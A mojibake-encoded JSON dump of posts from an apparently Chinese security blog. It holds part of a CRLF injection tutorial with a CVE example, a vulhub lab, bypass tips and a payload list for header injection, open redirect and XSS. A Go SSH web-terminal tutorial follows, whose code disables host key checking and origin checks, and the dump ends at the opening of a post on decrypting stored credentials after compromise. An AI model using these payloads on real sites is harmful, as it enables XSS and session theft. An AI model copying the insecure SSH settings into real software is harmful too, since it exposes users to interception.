reported_tweet_id=test%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE ç»è¿‡æœåŠ¡å™¨å¤„ç†åè¿”å›çš„æ•°æ®å°±ä¼šå˜æˆä¸‹é¢çš„htmlå“åº”çš„å½¢å¼ï¼š Set-cookie: testcontent-type: text/htmllocation:&lt;svg/onload=alert(innerHTML)&gt; 4ã€WEBrickå“åº”æ‹†åˆ†è¡¥å……ä¸€ä¾‹ç®€å•çš„CRLFï¼Œå–è‡ªCVE-2017-17742ï¼šWEBrickå–getå‚æ•°authorä½œä¸ºcookieè¾“å‡ºï¼Œè®¿é—® localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked è¿”å›æŠ¥æ–‡ï¼š å…­ã€é¶åœºæµ‹è¯•åˆ©ç”¨dockeræ­å»ºvulhubé¶åœºï¼Œè¿›å…¥/vulhub/nginx/insecure-configurationç›®å½• docker-compose up -d 8080ç«¯å£æ˜¯crlfæ¼æ´é¶åœº Nginxä¼šå°†$uriè¿›è¡Œè§£ç ï¼Œå¯¼è‡´ä¼ å…¥%0a%0då³å¯å¼•å…¥æ¢è¡Œç¬¦ï¼Œé€ æˆCRLFæ³¨å…¥æ¼æ´ã€‚ é”™è¯¯çš„é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼ˆåŸæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†è®©httpçš„è¯·æ±‚è·³è½¬åˆ°httpsä¸Šï¼‰ï¼š location / &#123; return 302 https://$host$uri;&#125; ä¸ƒã€æŒ–æ˜æŠ€å·§æŒ–æ˜æ­¤ç±»æ¼æ´ï¼Œä¾æ—§è¦éµå¾ªäº˜å¤ä¸å˜çš„åŸåˆ™ï¼Œè§‚å¯Ÿæˆ‘ä»¬çš„è¾“å…¥â€œè¾“å…¥â€œå’Œâ€œè¾“å‡ºâ€ä½ç½®ï¼Œå¯¹äºCRLFåˆ™æ˜¯è§‚å¯Ÿè¿”å›çš„å„ç§ç±»å‹çš„åè®®å¤´ï¼Œæ‰€ä»¥æŒ–æ˜åˆ†ä¸‰æ­¥ï¼š è§‚å¯Ÿè¾“å‡ºæ˜¯å¦åœ¨è¿”å›å¤´ä¸­ï¼ŒæŸ¥çœ‹è¾“å…¥ï¼Œå¯èƒ½æ˜¯åœ¨URLå€¼å’Œå‚æ•°ã€cookieå¤´ä¸­ã€‚åœ¨è¿‡å¾€çš„æŒ–æ˜è¿‡ç¨‹ä¸­ï¼Œæœ€å¸¸è§çš„ä¸¤ç§æƒ…å†µæ˜¯ä½¿ç”¨è¾“å…¥å‚æ•°åˆ›å»º Cookieå’Œ302è·³è½¬locationå¤„ã€‚ æäº¤%0D%0Aå­—ç¬¦ï¼ŒéªŒè¯æœåŠ¡å™¨æ˜¯å¦å“åº”%0D%0Aï¼Œè‹¥è¿‡æ»¤å¯ä»¥é€šè¿‡åŒé‡ç¼–ç ç»•è¿‡ã€‚ æ¼æ´åˆ©ç”¨ï¼Œä½¿æ€ä¼¤æœ€å¤§åŒ–ï¼Œå°†æ¼æ´è½¬åŒ–ä¸ºHTMLæ³¨å…¥ï¼ŒXSSï¼Œç¼“å­˜ç­‰ã€‚ å…«ã€é˜²å¾¡æ‰‹æ®µè¦é¿å…httpå“åº”æˆªæ–­ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š å¯¹ç”¨æˆ·çš„æ•°æ®è¿›è¡Œåˆæ³•æ€§æ ¡éªŒï¼Œå¯¹ç‰¹æ®Šçš„å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œå¦‚&lt;ã€&gt;ã€â€™ã€â€ã€CRã€LFç­‰ï¼Œé™åˆ¶ç”¨æˆ·è¾“å…¥çš„CRå’ŒLFï¼Œæˆ–è€…å¯¹CRå’ŒLFå­—ç¬¦æ­£ç¡®ç¼–ç åå†è¾“å‡ºï¼Œä»¥é˜²æ­¢æ³¨å…¥è‡ªå®šä¹‰HTTPå¤´ã€‚ åˆ›å»ºå®‰å…¨å­—ç¬¦ç™½åå•ï¼Œåªæ¥å—ç™½åå•ä¸­çš„å­—ç¬¦å‡ºç°åœ¨HTTPå“åº”å¤´æ–‡ä»¶ä¸­ã€‚ åœ¨å°†æ•°æ®ä¼ é€åˆ°httpå“åº”å¤´ä¹‹å‰ï¼Œåˆ é™¤æ‰€æœ‰çš„æ¢è¡Œç¬¦ã€‚ ä¹ã€CRLF Payloadæ¢æµ‹æ¼æ´ï¼š%0d%0aheader:header%0aheader:header%0dheader:header%23%0dheader:header%3f%0dheader:header/%250aheader:header/%250aheader:header/%%0a0aheader:header/%3f%0dheader:header/%23%0dheader:header/%25%30aheader:header/%25%30%61header:header/%u000aheader:header å¼€æ”¾é‡å®šå‘ï¼š/www.google.com/%2f%2e%2e%0d%0aheader:header CRLF-XSSï¼š%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e XSSç»•è¿‡ï¼š%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/ Locationï¼š%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert(&#x27;XSS&#x27;);%3C%2fscript%3E åã€å‚è€ƒé“¾æ¥ https://www.cnblogs.com/echojson/p/12805102.html https://www.freebuf.com/column/202762.html https://cloud.tencent.com/developer/article/1516335","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Goå®ç°SSHè¿œç¨‹ç»ˆç«¯åŠWebSocket","slug":"Goå®ç°SSHè¿œç¨‹ç»ˆç«¯åŠWebSocket","date":"2023-02-28T06:01:32.000Z","updated":"2023-02-28T06:11:34.417Z","comments":true,"path":"post/f1b02e7a.html","link":"","permalink":"https://wolke.cn/post/f1b02e7a.html","excerpt":"","text":"ä¸€ã€ä½¿ç”¨å¯†ç è®¤è¯è¿æ¥è¿æ¥åŒ…å«äº†è®¤è¯ï¼Œå¯ä»¥ä½¿ç”¨passwordæˆ–è€…sshkey ä¸¤ç§æ–¹å¼è®¤è¯ï¼Œä¸‹é¢é‡‡ç”¨å¯†ç è®¤è¯æ–¹å¼å®Œæˆè¿æ¥ package mainimport ( &quot;fmt&quot; &quot;github.com/mitchellh/go-homedir&quot; &quot;golang.org/x/crypto/ssh&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;time&quot;)func main() &#123; sshHost := &quot;home&quot; sshUser := &quot;x&quot; sshPassword := &quot;xxx&quot; sshType := &quot;password&quot; // password æˆ–è€… key sshKeyPath := &quot;&quot; // ssh id_rsa.id &quot;è·¯å¾„ sshPort := 22 // åˆ›å»ºsshpç™»å½•é…ç½® config := &amp;ssh.ClientConfig&#123; Timeout: time.Second, // ssh è¿æ¥time outæ—¶é—´ä¸€ç§’é’Ÿï¼Œå¦‚æœsshéªŒè¯é”™è¯¯ï¼Œä¼šåœ¨ä¸€ç§’å†…è¿”å› User: sshUser, HostKeyCallback: ssh.InsecureIgnoreHostKey(), // è¿™ä¸ªå¯ä»¥ï¼Œä½†æ˜¯ä¸å¤Ÿå®‰å…¨ // HostKeyCallback: hostKeyCallBackFunc(h.host) &#125; if sshType == &quot;password&quot; &#123; config.Auth = []ssh.AuthMethod&#123;ssh.Password(sshPassword)&#125; &#125; else &#123; config.Auth = []ssh.AuthMethod&#123;publicKeyAuthFunc(sshKeyPath)&#125; &#125; // dial è·å–ssh client addr := fmt.Sprintf(&quot;%s:%d&quot;, sshHost, sshPort) sshClient, err := ssh.Dial(&quot;tcp&quot;, addr, config) if err != nil &#123; log.Fatal(&quot;åˆ›å»ºssh client å¤±è´¥&quot;, err) &#125; defer sshClient.Close() // åˆ›å»ºssh-session session, err := sshClient.NewSession() if err != nil &#123; log.Fatal(&quot;åˆ›å»ºssh session å¤±è´¥&quot;, err) &#125; defer session.Close() // æ‰§è¡Œè¿œç¨‹å‘½ä»¤ combo, err := session.CombinedOutput(&quot;whoami; cd /; ls -la&quot;) if err != nil &#123; log.Fatal(&quot;è¿œç¨‹æ‰§è¡Œcmdå¤±è´¥&quot;, err) &#125; log.Println(&quot;å‘½ä»¤è¾“å‡º:&quot;, string(combo))&#125;func publicKeyAuthFunc(kPath string) ssh.AuthMethod &#123; keyPath, err := homedir.Expand(kPath) if err != nil &#123; log.Fatal(&quot;find key&#x27;s home dir failed&quot;, err) &#125; key, err := ioutil.ReadFile(keyPath) if err != nil &#123; log.Fatal(&quot;ssh key file read failed&quot;, err) &#125; // Create the Signer for this private key. signer, err := ssh.ParsePrivateKey(key) if err != nil &#123; log.Fatal(&quot;ssh key signer failed&quot;, err) &#125; return ssh.PublicKeys(signer)&#125; ä»£ç è¯¦è§£ é…ç½®ssh.ClientConfig å»ºè®¾TimeOutè‡ªå®šä¹‰ä¸€ä¸ªæ¯”è¾ƒç«¯çš„æ—¶é—´ è‡ªå®šä¹‰HostKeyCallbackå¦‚æœæƒ³ç®€ä¾¿å°±ä½¿ç”¨ssh.InsecureIgnoreHostKeyå›è°ƒ publicKeyAuthFuncå¦‚æœä½¿ç”¨keyç™»å½•ï¼Œå°±éœ€è¦ç”¨è¿™ä¸ªå‡½æ•°é‡è¯»å–id_rsaç§é’¥ï¼Œå½“ç„¶æ‚¨å¯ä»¥è‡ªå®šä¹‰è¿™ä¸ªè®¿é—®è®©ä»–æ”¯æŒå­—ç¬¦ä¸² ssh.Dialåˆ›å»ºsshå®¢æˆ·ç«¯ æ‹¼æ¥å­—ç¬¦ä¸²å¾—åˆ°sshè¿æ¥åœ°å€ï¼ŒåŒæ—¶ä¸è¦å¿˜è®°defer client.Close() sshClient.NewSessionåˆ›å»ºsessionä¼šè¯ å¯ä»¥è‡ªå®šä¹‰stdinï¼Œstdout å¯ä»¥åˆ›å»ºpty å¯ä»¥SetEnv æ‰§è¡Œå‘½ä»¤CombinedOutput run ... go run main.gototal 84dr-xr-xr-x. 20 root root 4096 Sep 28 09:38 .dr-xr-xr-x. 20 root root 4096 Sep 28 09:38 ..-rw-r--r-- 1 root root 0 Aug 18 2017 .autorelabellrwxrwxrwx. 1 root root 7 Aug 18 2017 bin -&gt; usr/bindr-xr-xr-x. 4 root root 4096 Sep 12 2017 bootdrwxrwxr-x 2 rsync rsync 4096 Jul 29 23:37 datadrwxr-xr-x 19 root root 2980 Jul 28 13:29 devdrwxr-xr-x. 95 root root 12288 Nov 5 23:46 etcdrwxr-xr-x. 5 root root 4096 Nov 3 16:11 homelrwxrwxrwx. 1 root root 7 Aug 18 2017 lib -&gt; usr/liblrwxrwxrwx. 1 root root 9 Aug 18 2017 lib64 -&gt; usr/lib64drwx------. 2 root root 16384 Aug 18 2017 lost+founddrwxr-xr-x. 2 root root 4096 Nov 5 2016 mediadrwxr-xr-x. 3 root root 4096 Jul 28 21:01 mntdrwxr-xr-x 4 root root 4096 Sep 28 09:38 nginx_testdrwxr-xr-x. 8 root root 4096 Nov 3 16:10 optdr-xr-xr-x 87 root root 0 Jul 28 13:26 procdr-xr-x---. 18 root root 4096 Nov 4 00:38 rootdrwxr-xr-x 27 root root 860 Nov 4 21:57 runlrwxrwxrwx. 1 root root 8 Aug 18 2017 sbin -&gt; usr/sbindrwxr-xr-x. 2 root root 4096 Nov 5 2016 srvdr-xr-xr-x 13 root root 0 Jul 28 21:26 sysdrwxrwxrwt. 8 root root 4096 Nov 5 03:09 tmpdrwxr-xr-x. 13 root root 4096 Aug 18 2017 usrdrwxr-xr-x. 21 root root 4096 Nov 3 16:10 var äºŒã€WebSocketç®€ä»‹HTML5å¼€å§‹æä¾›çš„ä¸€ç§æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡ŒåŒå·¥é€šè®¯çš„ç½‘ç»œæŠ€æœ¯ï¼Œå±äºåº”ç”¨å±‚åè®®ï¼Œå®ƒåŸºäºTCPä¼ è¾“åè®®ï¼Œå¹¶å¤ç”¨HTTPçš„æ¡æ‰‹é€šé“ï¼š å¯¹å¤§éƒ¨åˆ†webå¼€å‘è€…æ¥è¯´ï¼Œä¸Šé¢æè¿°æœ‰ç‚¹æ¯ç‡¥ï¼Œåªéœ€è¦è®°ä¸‹ä»¥ä¸‹ä¸‰ç‚¹ 1. WebSocketå¯ä»¥åœ¨æµè§ˆå™¨é‡Œä½¿ç”¨2. æ”¯æŒåŒå‘é€šä¿¡3. ä½¿ç”¨å¾ˆç®€å• å¯¹æ¯”HTTPåè®®çš„è¯ï¼Œæ¦‚æ‹¬çš„è¯´å°±æ˜¯: æ”¯æŒåŒå‘é€šä¿¡ï¼Œæ›´çµæ´»ï¼Œæ›´é«˜æ•ˆï¼Œå¯æ‰©å±•æ€§æ›´å¥½ 1. æ”¯æŒåŒå‘é€šä¿¡,å®æ—¶æ€§æ›´å¼º2. æ›´å¥½çš„äºŒè¿›åˆ¶æ”¯æŒ3. è¾ƒå°‘çš„æ§åˆ¶å¼€é”€,è¿æ¥åˆ›å»ºå,å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¿›è¡Œæ•°æ®äº¤æ¢æ—¶,åè®®æ§åˆ¶çš„æ•°æ®åŒ…å¤´éƒ¨è¾ƒå°,åœ¨ä¸åŒ…å«å¤´éƒ¨çš„æƒ…å†µä¸‹,æœåŠ¡ç«¯åˆ°å®¢æˆ·ç«¯çš„åŒ…å¤´åªæœ‰2-10å­—èŠ‚(å–å†³äºæ•°æ®åŒ…é•¿åº¦), å®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„è¯,éœ€è¦åŠ ä¸Šé¢å¤–4å­—èŠ‚çš„æ©ç ,è€ŒHTTPæ¯æ¬¡åŒå¹´é«˜æ–°éƒ½éœ€è¦æºå¸¦å®Œæ•´çš„å¤´éƒ¨4. æ”¯æŒæ‰©å±•,wsåè®®å®šä¹‰äº†æ‰©å±•, ç”¨æˆ·å¯ä»¥æ‰©å±•åè®®, æˆ–è€…å®ç°è‡ªå®šä¹‰çš„å­åè®® ä¸‰ã€åŸºäºWebçš„Terminalç»ˆç«¯æ§åˆ¶å°1ã€è§£å†³é—®é¢˜å®Œæˆè¿™æ ·ä¸€ä¸ªWeb Terminalçš„ç›®çš„ä¸»è¦æ˜¯è§£å†³å‡ ä¸ªé—®é¢˜ï¼š 1.ä¸€å®šç¨‹åº¦ä¸Šå–ä»£xshellï¼ŒsecureRTï¼Œputtyç­‰sshç»ˆç«¯2.æ–¹ä¾¿èº«ä»½è®¤è¯ï¼Œè®¿é—®æ§åˆ¶3.æ–¹ä¾¿ä½¿ç”¨ï¼Œä¸å—ç”µè„‘ç¯å¢ƒçš„å½±å“ 2ã€æ•°æ®æµå‘è¦å®ç°è¿œç¨‹ç™»å½•çš„åŠŸèƒ½ï¼Œå…¶æ•°æ®æµå‘å¤§æ¦‚ä¸º æµè§ˆå™¨ &lt;--&gt; WebSocket &lt;---&gt; SSH &lt;---&gt; Linux OS å®ç°æµç¨‹ æµè§ˆå™¨å°†ä¸»æœºçš„ä¿¡æ¯(ip, ç”¨æˆ·å, å¯†ç , è¯·æ±‚çš„ç»ˆç«¯å¤§å°ç­‰)è¿›è¡ŒåŠ å¯†ï¼Œä¼ ç»™åå°, å¹¶é€šè¿‡HTTPè¯·æ±‚ä¸åå°åå•†å‡çº§åè®®ã€‚åè®®å‡çº§å®Œæˆåï¼Œåç»­çš„æ•°æ®äº¤æ¢åˆ™éµç…§web Socketçš„åè®®ã€‚ åå°å°†HTTPè¯·æ±‚å‡çº§ä¸ºweb Socketåè®®ï¼Œå¾—åˆ°ä¸€ä¸ªå’Œæµè§ˆå™¨æ•°æ®äº¤æ¢çš„è¿æ¥é€šé“ åå°å°†æ•°æ®è¿›è¡Œè§£å¯†æ‹¿åˆ°ä¸»æœºä¿¡æ¯ï¼Œåˆ›å»ºä¸€ä¸ªSSH å®¢æˆ·ç«¯ï¼Œä¸è¿œç¨‹ä¸»æœºçš„SSH æœåŠ¡ç«¯åå•†åŠ å¯†ï¼Œäº’ç›¸è®¤è¯, ç„¶åå»ºç«‹ä¸€ä¸ªSSH Channel åå°å’Œè¿œç¨‹ä¸»æœºæœ‰äº†é€šè®¯çš„ä¿¡é“, ç„¶ååå°å°†ç»ˆç«¯çš„å¤§å°ç­‰ä¿¡æ¯é€šè¿‡SSH Channelè¯·æ±‚è¿œç¨‹ä¸»æœºåˆ›å»ºä¸€ä¸ª pty(ä¼ªç»ˆç«¯)ï¼Œå¹¶è¯·æ±‚å¯åŠ¨å½“å‰ç”¨æˆ·çš„é»˜è®¤ shell åå°é€šè¿‡ Socketè¿æ¥é€šé“æ‹¿åˆ°ç”¨æˆ·è¾“å…¥ï¼Œå†é€šè¿‡SSH Channelå°†è¾“å…¥ä¼ ç»™ptyï¼Œptyå°†è¿™äº›æ•°æ®äº¤ç»™è¿œç¨‹ä¸»æœºå¤„ç†åæŒ‰ç…§å‰é¢æŒ‡å®šçš„ç»ˆç«¯æ ‡å‡†è¾“å‡ºåˆ°SSH Channelä¸­ï¼ŒåŒæ—¶é”®ç›˜è¾“å…¥ä¹Ÿä¼šå‘é€ç»™SSH Channel åå°ä»SSH Channelä¸­æ‹¿åˆ°æŒ‰ç…§ç»ˆç«¯å¤§å°çš„æ ‡å‡†è¾“å‡ºååˆé€šè¿‡Socketè¿æ¥å°†è¾“å‡ºè¿”å›ç»™æµè§ˆå™¨ï¼Œç”±æ­¤å˜å®ç°äº†Web Terminal 3ã€ä»£ç å®ç°ç…§ä¸Šé¢çš„ä½¿ç”¨æµç¨‹åŸºäºä»£ç è§£é‡Šå¦‚ä½•å®ç° ï¼ˆ1ï¼‰å‡çº§HTTPåè®®ä¸ºWebSocketvar upgrader = websocket.Upgrader&#123; ReadBufferSize: 1024, WriteBufferSize: 1024, CheckOrigin: func(r *http.Request) bool &#123; return true &#125;,&#125; ï¼ˆ2ï¼‰å‡çº§åè®®å¹¶è·å¾—socketè¿æ¥connå°±æ˜¯socketè¿æ¥é€šé“ï¼Œæ¥ä¸‹æ¥åå°å’Œæµè§ˆå™¨ä¹‹é—´çš„é€šè®¯éƒ½å°†åŸºäºè¿™ä¸ªé€šé“ conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)if err != nil &#123; c.Error(err) return&#125; ï¼ˆ3ï¼‰åå°æ‹¿åˆ°ä¸»æœºä¿¡æ¯ï¼Œå»ºç«‹sshå®¢æˆ·ç«¯sshå®¢æˆ·ç«¯ç»“æ„ä½“ type SSHClient struct &#123; Username string `json:&quot;username&quot;` Password string `json:&quot;password&quot;` IpAddress string `json:&quot;ipaddress&quot;` Port int `json:&quot;port&quot;` Session *ssh.Session Client *ssh.Client channel ssh.Channel&#125;//åˆ›å»ºæ–°çš„sshå®¢æˆ·ç«¯æ—¶, é»˜è®¤ç”¨æˆ·åä¸ºroot, ç«¯å£ä¸º22func NewSSHClient() SSHClient &#123; client := SSHClient&#123;&#125; client.Username = &quot;root&quot; client.Port = 22 return client&#125; åˆå§‹åŒ–çš„æ—¶å€™æˆ‘ä»¬åªæœ‰ä¸»æœºçš„ä¿¡æ¯ï¼Œè€ŒSessionï¼Œclientï¼Œchanneléƒ½æ˜¯ç©ºçš„ï¼Œç°åœ¨å…ˆç”ŸæˆçœŸæ­£çš„client func (this *SSHClient) GenerateClient() error &#123; var ( auth []ssh.AuthMethod addr string clientConfig *ssh.ClientConfig client *ssh.Client config ssh.Config err error ) auth = make([]ssh.AuthMethod, 0) auth = append(auth, ssh.Password(this.Password)) config = ssh.Config&#123; Ciphers: []string&#123;&quot;aes128-ctr&quot;, &quot;aes192-ctr&quot;, &quot;aes256-ctr&quot;, &quot;aes128-gcm@openssh.com&quot;, &quot;arcfour256&quot;, &quot;arcfour128&quot;, &quot;aes128-cbc&quot;, &quot;3des-cbc&quot;, &quot;aes192-cbc&quot;, &quot;aes256-cbc&quot;&#125;, &#125; clientConfig = &amp;ssh.ClientConfig&#123; User: this.Username, Auth: auth, Timeout: 5 * time.Second, Config: config, HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error &#123; return nil &#125;, &#125; addr = fmt.Sprintf(&quot;%s:%d&quot;, this.IpAddress, this.Port) if client, err = ssh.Dial(&quot;tcp&quot;, addr, clientConfig); err != nil &#123; return err &#125; this.Client = client return nil&#125; ssh.Dial(&quot;tcp&quot;, addr, clientConfig)åˆ›å»ºè¿æ¥å¹¶è¿”å›å®¢æˆ·ç«¯ï¼Œå¦‚æœä¸»æœºä¿¡æ¯ä¸å¯¹æˆ–å…¶å®ƒé—®é¢˜è¿™é‡Œå°†ç›´æ¥å¤±è´¥ ï¼ˆ4ï¼‰é€šè¿‡sshå®¢æˆ·ç«¯åˆ›å»ºssh channelï¼Œå¹¶è¯·æ±‚ä¸€ä¸ªptyä¼ªç»ˆç«¯ï¼Œè¯·æ±‚ç”¨æˆ·çš„é»˜è®¤ä¼šè¯å¦‚æœä¸»æœºä¿¡æ¯éªŒè¯éªŒè¯é€šè¿‡ï¼Œå¯ä»¥é€šè¿‡ssh clientåˆ›å»ºä¸€ä¸ªé€šé“ï¼š channel, inRequests, err := this.Client.OpenChannel(&quot;session&quot;, nil)if err != nil &#123; log.Println(err) return nil&#125;this.channel = channel sshé€šé“åˆ›å»ºå®Œæˆåï¼Œè¯·æ±‚ä¸€ä¸ªæ ‡å‡†è¾“å‡ºçš„ç»ˆç«¯ï¼Œå¹¶å¼€å¯ç”¨æˆ·çš„é»˜è®¤shellï¼š ok, err := channel.SendRequest(&quot;pty-req&quot;, true, ssh.Marshal(&amp;req))if !ok || err != nil &#123; log.Println(err) return nil&#125;ok, err = channel.SendRequest(&quot;shell&quot;, true, nil)if !ok || err != nil &#123; log.Println(err) return nil&#125; ï¼ˆ5ï¼‰è¿œç¨‹ä¸»æœºä¸æµè§ˆå™¨å®æ—¶æ•°æ®äº¤æ¢ç°åœ¨ä¸ºæ­¢å»ºç«‹äº†ä¸¤ä¸ªé€šé“ï¼Œä¸€ä¸ªæ˜¯websocketï¼Œä¸€ä¸ªæ˜¯ssh channelï¼Œåå°å°†èµ·ä¸¤ä¸ªä¸»è¦çš„åç¨‹ï¼Œä¸€ä¸ªä¸åœçš„ä»websocketé€šé“é‡Œè¯»å–ç”¨æˆ·çš„è¾“å…¥ï¼Œå¹¶é€šè¿‡ssh channelä¼ ç»™è¿œç¨‹ä¸»æœºï¼š // è¿™é‡Œç¬¬ä¸€ä¸ªåç¨‹è·å–ç”¨æˆ·çš„è¾“å…¥go fun() &#123; // p ä¸ºç”¨æˆ·è¾“å…¥ _, p, err := ws.ReadMessage() if err != nil &#123; return &#125; _, err = this.channel.Write(p) if err != nil &#123; return &#125; &#125;&#125;() ç¬¬äºŒä¸ªä¸»åç¨‹å°†è¿œç¨‹ä¸»æœºçš„æ•°æ®ä¼ é€’ç»™æµè§ˆå™¨ï¼Œåœ¨è¿™ä¸ªåç¨‹é‡Œè¿˜å°†èµ·ä¸€ä¸ªåç¨‹ï¼Œä¸æ–­è·å–ssh channelé‡Œçš„æ•°æ®å¹¶ä¼ ç»™åå°å†…éƒ¨åˆ›å»ºçš„ä¸€ä¸ªé€šé“ï¼Œä¸»åç¨‹åˆ™æœ‰ä¸€ä¸ªæ­»å¾ªç¯ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´ä»å†…éƒ¨é€šé“é‡Œè¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶é€šè¿‡websocketä¼ ç»™æµè§ˆå™¨ï¼Œæ‰€ä»¥æ•°æ®ä¼ è¾“å¹¶ä¸æ˜¯çœŸæ­£å®æ—¶çš„ï¼Œè€Œæ˜¯æœ‰ä¸€ä¸ªé—´éš”åœ¨ï¼Œæˆ‘å†™çš„é»˜è®¤ä¸º100å¾®ç§’ï¼Œè¿™æ ·åŸºæœ¬æ„Ÿå—ä¸åˆ°å»¶è¿Ÿï¼Œè€Œä¸”å‡å°‘äº†æ¶ˆè€—ï¼Œæœ‰æ—¶æµè§ˆå™¨è¾“å…¥ä¸€ä¸ªå‘½ä»¤è·å–å¤§é‡æ•°æ®æ—¶ï¼Œä¼šæ„Ÿè§‰æ•°æ®å‡ºç°ä¼šä¸€é¡¿ä¸€é¡¿çš„ä¾¿æ˜¯å› ä¸ºè®¾ç½®äº†ä¸€ä¸ªé—´éš”ï¼š //ç¬¬äºŒä¸ªåç¨‹å°†è¿œç¨‹ä¸»æœºçš„è¿”å›ç»“æœè¿”å›ç»™ç”¨æˆ·go func() &#123; br := bufio.NewReader(this.channel) buf := []byte&#123;&#125; t := time.NewTimer(time.Microsecond * 100) defer t.Stop() // æ„å»ºä¸€ä¸ªä¿¡é“, ä¸€ç«¯å°†æ•°æ®è¿œç¨‹ä¸»æœºçš„æ•°æ®å†™å…¥, ä¸€æ®µè¯»å–æ•°æ®å†™å…¥ws r := make(chan rune) // å¦èµ·ä¸€ä¸ªåç¨‹, ä¸€ä¸ªæ­»å¾ªç¯ä¸æ–­çš„è¯»å–ssh channelçš„æ•°æ®, å¹¶ä¼ ç»™rä¿¡é“ç›´åˆ°è¿æ¥æ–­å¼€ go func() &#123; defer this.Client.Close() defer this.Session.Close() for &#123; x, size, err := br.ReadRune() if err != nil &#123; log.Println(err) ws.WriteMessage(1, []byte(&quot;\\033[31må·²ç»å…³é—­è¿æ¥!\\033[0m&quot;)) ws.Close() return &#125; if size &gt; 0 &#123; r &lt;- x &#125; &#125; &#125;() // ä¸»å¾ªç¯ for &#123; select &#123; // æ¯éš”100å¾®ç§’, åªè¦bufçš„é•¿åº¦ä¸ä¸º0å°±å°†æ•°æ®å†™å…¥ws, å¹¶é‡ç½®æ—¶é—´å’Œbuf case &lt;-t.C: if len(buf) != 0 &#123; err := ws.WriteMessage(websocket.TextMessage, buf) buf = []byte&#123;&#125; if err != nil &#123; log.Println(err) return &#125; &#125; t.Reset(time.Microsecond * 100) // å‰é¢å·²ç»å°†ssh channelé‡Œè¯»å–çš„æ•°æ®å†™å…¥åˆ›å»ºçš„é€šé“r, è¿™é‡Œè¯»å–æ•°æ®, ä¸æ–­å¢åŠ bufçš„é•¿åº¦, åœ¨è®¾å®šçš„ 100 microsecondåç”±ä¸Šé¢åˆ¤å®šé•¿åº¦æ˜¯å¦è¿”é€æ•°æ® case d := &lt;-r: if d != utf8.RuneError &#123; p := make([]byte, utf8.RuneLen(d)) utf8.EncodeRune(p, d) buf = append(buf, p...) &#125; else &#123; buf = append(buf, []byte(&quot;@&quot;)...) &#125; &#125; &#125;&#125;() 4ã€web-terminalï¼ˆ1ï¼‰å‰ç«¯git clone https://github.com/chengjoey/web-terminal-client.gitcd web-terminal-client# install dependenciesnpm install# serve with hot reload at localhost:8080npm run dev// éœ€è¦çš„è¯å°±æ‰§è¡Œï¼Œä¸éœ€è¦çš„è¯è¿è¡Œnpm run devå³å¯å¯åŠ¨å‰ç«¯äº†# build for production with minificationnpm run build# build for production and view the bundle analyzer reportnpm run build --report ï¼ˆ2ï¼‰åç«¯go get github.com/chengjoey/web-terminalLinuxï¼š web-terminalWindows: web-terminal.exe ï¼ˆ3ï¼‰ä½¿ç”¨è®¿é—®http://127.0.0.1:5001/ ï¼Œå³å¯è¿›è¡Œè¿æ¥å’Œshellæ“ä½œ å››ã€å‚è€ƒé“¾æ¥https://www.cnblogs.com/you-men/p/13934845.html https://mojotv.cn/2019/05/22/golang-ssh-session","categories":[{"name":"Go","slug":"Go","permalink":"https://wolke.cn/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://wolke.cn/tags/Go/"}],"author":"w01ke"},{"title":"å†…ç½‘å¸¸ç”¨å·¥å…·å¯†ç è§£å¯†ã€æ‰©å¤§æˆ˜æœã€‘","slug":"å†…ç½‘å¸¸ç”¨å·¥å…·å¯†ç è§£å¯†ã€æ‰©å¤§æˆ˜æœã€‘","date":"2023-02-20T02:37:51.000Z","updated":"2023-02-20T02:47:33.085Z","comments":true,"path":"post/37cc6900.html","link":"","permalink":"https://wolke.cn/post/37cc6900.html","excerpt":"","text":"ä¸€ã€å‰è¨€å½“é€šè¿‡ä¸€äº›æ–¹æ³•æ‹¿åˆ°ç³»ç»Ÿæƒé™åï¼Œç³»ç»Ÿä¸­å¯èƒ½å­˜åœ¨è¿æ¥å…¶ä»–æœåŠ¡å™¨ã€æ•°æ®åº“çš„è¿œç¨‹ç®¡ç†è½¯ä»¶ï¼Œè¿™æ—¶å€™å°±éœ€è¦å»è§£å¯†åƒsshè¿™ç±»çš„è¿æ¥è½¯ä»¶ï¼Œè·å–æ›´å¤šä¸»æœºå¾—æƒé™æ¥æ‰©å¤§æˆ˜æœã€‚ 